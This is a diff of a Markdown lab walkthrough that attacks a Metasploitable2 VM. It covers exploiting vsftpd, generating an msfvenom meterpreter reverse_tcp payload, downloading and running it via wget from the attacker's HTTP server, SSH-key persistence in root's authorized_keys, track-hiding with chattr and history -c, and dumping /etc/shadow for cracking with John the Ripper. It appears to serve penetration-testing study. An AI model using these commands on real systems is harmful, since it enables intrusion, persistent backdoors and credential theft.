@@ -37,6 +37,7 @@ search vsftpd
 
 We know that there is an exploit for that protocol version. Let's exploit it!
 
+---
 # 2.2. Exploit the vulnerability
 
 Select the exploit, set the parameters and check that all the options are correct:
@@ -60,9 +61,7 @@ Successful exploitation provides a reverse command shell session as the root use
 script /dev/null -c bash
 ```
 
-## 2.2.1. Read files from the target machine
-
-In the target `Metasploitable2`, create the file `testfile.txt` with the following content:
+Now you could read a file that is in the target machine. Imagine that there is the file  `testfile.txt` with the following content:
 
 ```
 Super secret condifential content
@@ -71,14 +70,14 @@ username Hello34
 pwd 123456789
 ```
 
-
 Now you could read files from the attacker `Kali linux`:
 
 ![[Pasted image 20250209200514.png]]
 
-## 3. Post-exploitation
+---
+## 2.3. Post-exploitation: SSH key persistence
 
-### 3.1. Upload files to the target machine
+After gaining access to a Linux system, **SSH key persistence** allows you to maintain access without relying on passwords or vulnerable services. This is commonly used in **post-exploitation** to create a stealthy backdoor. The final objective is to upload a **public SSH key** to the target machine from the attacker machine. 
 
 Use cases for uploading files:
 - Deploying Backdoors – Installing persistent malware.
@@ -86,9 +85,9 @@ Use cases for uploading files:
 - Privilege Escalation – Dropping exploits or DLL files.
 - Data Exfiltration – Uploading tools for data collection and exfiltration.
 
-A **payload** is the part of an exploit that executes malicious code on a target system after a vulnerability has been successfully exploited. It determines what happens after access is gained, such as opening a shell, executing commands, or creating a backdoor. **`msfvenom`** is used here to  **generate the payload** for this exploit.
+To upload and download files from the target machine, we will need to create a **payload**. A **payload** is the part of an exploit that executes malicious code on a target system after a vulnerability has been successfully exploited. It determines what happens after access is gained, such as opening a shell, executing commands, or creating a backdoor. **`msfvenom`** is used here to  **generate the payload** for this exploit.
 
-#### **Types of Payloads in Metasploit**
+#### Types of Payloads in Metasploit
 
 1. **Singles** – Self-contained, executes a single action (e.g., add a user).
 2. **Stagers** – Small, initial payloads that establish a connection and load larger payloads (e.g., `reverse_tcp`).
@@ -99,7 +98,7 @@ In this example, it will be done the following:
 - The stager connects back to the attacker's machine.
 - It then downloads and executes the **stage** (`meterpreter`), which is the full payload.
 
-### 3.1. Generate the payload
+### 2.3.1. Generate the payload
 
 Generation of payload `reverse_tcp` with `msfvenon`:
 ```
@@ -113,7 +112,7 @@ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<AttackerIp> LPORT=<PortSele
 
 We need now a way to send the file to the target machine.
 
-### 3.2. Upload download and execute the payload file
+### 2.3.2. Upload, download and execute the payload file
 Create a server in the attackers machine so that the target machine can download the infected file from my current directory:
 ```
 python -m http.server 80
@@ -121,14 +120,21 @@ python -m http.server 80
 
 ![[Pasted image 20250214215337.png]]
 
-Download the file in the target machine from the attacker machine:
+Download the file in the target machine from the attacker to the target machine using the vsftpd exploit:
 ```
 wget http://<AttackerIp>/hola
 ```
 
 ![[Pasted image 20250215104137.png]]
 
-Listen in the attacker machine. The multi/handler module in Metasploit is used to catch and interact with incoming connections from payloads like reverse shells or Meterpreter sessions. It's commonly used with msfvenom-generated payloads. Prepare Meterpreter listener:
+In the target machine run the payload:
+```
+chmod +x hola
+./hola
+```
+
+Now, the attacker machine has to be listening. The `multi/handler` module in Metasploit is used to catch and interact with incoming connections from payloads like reverse shells or meterpreter sessions. It's commonly used with msfvenom-generated payloads. Prepare the meterpreter listener:
+
 ```
 msfconsole
 use exploit/multi/handler
@@ -138,21 +144,11 @@ set LPORT <PortSelected>
 run
 ```
 
-In the target machine run:
-```
-chmod +x hola
-./hola
-```
-
 In the attacker machine you will see the meterpreter session open with the reverse shell:
 
 ![[Pasted image 20250215104444.png]]
 
-## 3. Post-exploitation: Maintaining Access
-
-After gaining access to a Linux system, **SSH key persistence** allows you to maintain access without relying on passwords or vulnerable services. This is commonly used in **post-exploitation** to create a stealthy backdoor.
-
-### X. Generate the SSH Key
+### 2.3.3. Generate the SSH Key
 In the attacker machine, we generate a SSH Key:
 
 ```
@@ -167,9 +163,9 @@ This creates:
 
 ![[Pasted image 20250215111502.png]]
 
-### X. Upload the public SSH Key to the target machine
+### 2.3.4. Upload the public SSH Key to the target machine
 
-Transfer the public key to the target: (placed in root to maintain root access)
+Transfer the public key to the target (placed in root to maintain root access):
 
 ```
 upload persist_key.pub /root/.ssh/authorized_keys
@@ -177,31 +173,41 @@ upload persist_key.pub /root/.ssh/authorized_keys
 
 ![[Pasted image 20250215111820.png]]
 
-Ensure root login via SSH is enabled in /etc/ssh/sshd_config:
+### 2.3.5. SSH checks in the target machine
+
+Ensure root login via SSH is enabled in `/etc/ssh/sshd_config`:
 ```
 PermitRootLogin yes
 ```
 
 Restart SSH in the target machine:
-
 ```
 sudo /etc/init.d/ssh restart
 ```
 
 ![[Pasted image 20250215113357.png]]
 
-
-Check the port 
-
+Check the state of the SSH port (22) from the attacker machine:
 ![[Pasted image 20250215115813.png]]
 
+In this case, the port is not open. Enable it from the target machine:
 ```
 sudo ufw allow 22
 ```
 
-
+Verify that it is open:
 ![[Pasted image 20250215121301.png]]
-### X. Connect any time
+### 2.3.6. SSH Connection
+
+```
+ssh -v -i ~/.ssh/persist_key -oHostKeyAlgorithms=ssh-rsa -oPubKeyAcceptedKeyTypes=ssh-rsa root@target_ip
+```
+
+![[Pasted image 20250215133514.png]]
+
+### 2.3.6.1. Troubleshooting
+
+Host key algorithm AND pub key type has to be defined in the SSH command. Examples of incomplete commands:
 
 ```
 ssh -i ~/.ssh/persist_key root@target_ip
@@ -214,19 +220,13 @@ ssh -v -i ~/.ssh/persist_key -oHostKeyAlgorithms=ssh-rsa root@target_ip
 ```
 
 ![[Pasted image 20250215133412.png]]
-we do not know the user password
+I do not know the user password!
 
+### 2.3.7. Hide Your Tracks (Stealth)
 
-```
-ssh -v -i ~/.ssh/persist_key -oHostKeyAlgorithms=ssh-rsa -oPubKeyAcceptedKeyTypes=ssh-rsa root@target_ip
-```
-
-![[Pasted image 20250215133514.png]]
-
-
-### X. Hide Your Tracks (Stealth)
-
+REVISE THIS PART!!
 Make the SSH key hidden:
+
 ```
 chmod 400 ~/.ssh/authorized_keys
 chattr +i ~/.ssh/authorized_keys  # Prevent deletion
@@ -240,32 +240,31 @@ history -c
 ```
 
 
-## X. Dumping User and Service Credentials
+---
+## 2.4. Post-exploitation: Password and user cracking
 
-Get the content of the following files from the target machine:
+Instead of storing actual passwords, systems store the hashed version to enhance security. A **hashed password** is a password that has been transformed into a fixed-length string using a **one-way cryptographic function**.
 
-```
-/etc/shadow 
-/etc/passwd
-```
+The hashed passwords and the user details are stored into two important files from the target machine:
 
-Then use unshadow to merge them:
+- `/etc/shadow`: Stores **hashed** passwords for system users (only accessible by root).
+- `/etc/passwd`: Contains user account details (including usernames and user IDs), but **does not** store password hashes anymore.
+
+We will use **John the Ripper (JtR)**, which attempts to crack the hashed passwords using dictionary attacks, brute force, or other methods. But first, we need to passed the information from the target machine using `unshadow`. `unshadow` is a tool that combines `/etc/passwd` and `/etc/shadow` into a format suitable for cracking. This creates `hashes.txt`, which contains usernames alongside their **password hashes**:
+
 ```
 unshadow passwd shadow > hashes.txt
 ```
 
 ![[Pasted image 20250215164528.png]]
 
-Use John the Ripper
+Use John the Ripper:
+
 ```
 john hashes.txt
 ```
 
 ![[Pasted image 20250215164847.png]]
 
+Now we have the root password.
 
-Detection & Prevention (to be added in the defensive measurements)
-
-    Admins should monitor ~/.ssh/authorized_keys for unauthorized entries.
-    Disable SSH root login (PermitRootLogin no).
-    Use SSH key restrictions (e.g., command="restricted_command").
